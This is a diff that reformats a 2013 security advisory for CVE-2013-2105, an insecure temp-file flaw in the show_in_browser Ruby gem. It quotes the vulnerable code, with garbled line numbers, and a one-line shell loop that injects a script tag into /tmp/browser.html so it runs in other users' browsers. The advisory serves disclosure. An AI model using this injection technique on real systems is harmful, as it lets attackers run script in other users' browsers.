@@ -1,26 +1,31 @@
-                                Advisory #: 100
-Title: Show In Browser 0.0.3 Ruby Gem /tmp file injection vulnerability
-Author:Larry W. Cashdollar, @_larry0
-Date: 2013-05-23
-Download Site: https://rubygems.org/gems/show_in_browser
-Vendor:Jonathan Leung
-Vendor Notified: 2013-05-23
-Vendor Contact: me@jonl.org
-Description: Opens arbitrary text in your browser.
-Vulnerability:
-The following code uses the temporary file "/tmp/browser.html" insecurely. 2
-FILE_LOCATION = "/tmp/browser.html" 3 4 class << self 5 6 def show(html) 7 file
-= File.open(FILE_LOCATION, 'w') 8 file.write(html) 9 file.close 0 11 `open #
-{FILE_LOCATION}` By a malicious user creating /tmp/browser.html first and
-repeatedly writing to it they can inject malicious html into the file right
-before it is about to be opened.
-CVE-2013-2105
-JSON:Export
-Exploit Code:
-   1. nobody () pitter:/$ while (true); do echo "<script> alert('Hello'); </
-      script>" >> /tmp/browser.html; done
-   2.  
-   3. Will pop up a java script alert in other gem users browser.
-   4.  
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/show_in_browser.html
+
+                               Advisory #: 100
+
+   Title: Show In Browser 0.0.3 Ruby Gem /tmp file injection vulnerability
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2013-05-23
+   Download Site: https://rubygems.org/gems/show_in_browser
+   Vendor: Jonathan Leung
+   Vendor Notified: 2013-05-23
+   Vendor Contact: me@jonl.org
+   Description: Opens arbitrary text in your browser.
+   Vulnerability:
+   The following code uses the temporary file "/tmp/browser.html"
+   insecurely. 2 FILE_LOCATION = "/tmp/browser.html" 3 4 class << self 5 6
+   def show(html) 7 file = File.open(FILE_LOCATION, 'w') 8
+   file.write(html) 9 file.close 0 11 `open #{FILE_LOCATION}` By a
+   malicious user creating /tmp/browser.html first and repeatedly writing
+   to it they can inject malicious html into the file right before it is
+   about to be opened.
+   CVE-2013-2105
+   JSON: Export
+   Exploit Code:
+
+    1. nobody () pitter:/$ while (true); do echo "<script> alert('Hello');
+       </script>" >> /tmp/browser.html; done
+    2.
+    3. Will pop up a java script alert in other gem users browser.
+    4.
+
+   Screen Shots:
+   Advisory: http://www.vapid.dhs.org/advisories/show_in_browser.html
